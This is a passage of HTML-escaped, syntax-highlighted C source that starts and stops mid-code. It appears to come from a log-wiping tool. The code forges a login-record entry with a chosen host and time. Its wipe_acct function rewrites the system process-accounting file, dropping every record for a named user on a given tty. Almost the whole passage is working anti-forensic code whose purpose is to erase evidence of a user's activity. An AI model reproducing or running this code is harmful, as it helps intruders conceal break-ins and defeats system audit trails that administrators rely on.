class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ell_time\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003emktime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ehost\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003estrncpy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ell_host\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ehost\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ell_host\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Done.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef NO_ACCT\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * ACCOUNT editing.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ewipe_acct\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\t\t\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efd2\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003eacct\u003c/span\u003e\t\u003cspan class=\"n\"\u003eac\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003echar\u003c/span\u003e\t\t\u003cspan class=\"n\"\u003ettyn\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e50\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003epasswd\u003c/span\u003e   \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003epwd\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003estat\u003c/span\u003e\t\u003cspan class=\"n\"\u003esbuf\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003echar\u003c/span\u003e\t\t\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003etmpf\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Patching %s .... \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eACCT_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003efflush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Open the acct file and temporary file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eACCT_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_RDONLY\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening %s\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eACCT_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Grab a unique temporary filename.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"n\"\u003etmpf\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003etmpnam\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etmpf\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_WRONLY\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"n\"\u003eO_CREAT\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"n\"\u003eO_TRUNC\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e600\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening tmp ACCT file\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epwd\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003egetpwnam\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Can\u0026#39;t find user in passwd.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Determine tty\u0026#39;s device number\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003estrcpy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ettyn\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;/dev/\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003estrcat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ettyn\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nf\"\u003estat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ettyn\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003esbuf\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Determining tty device number.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nf\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eac\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eac\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eac\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eac_uid\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003epw_uid\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003eac\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eac_tty\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003esbuf\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003est_rdev\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"nf\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eac\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eac\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd2\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003ecopy_file\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etmpf\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eACCT_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nf\"\u003eunlink\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etmpf\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Unlinking tmp WTMP file.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Done.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 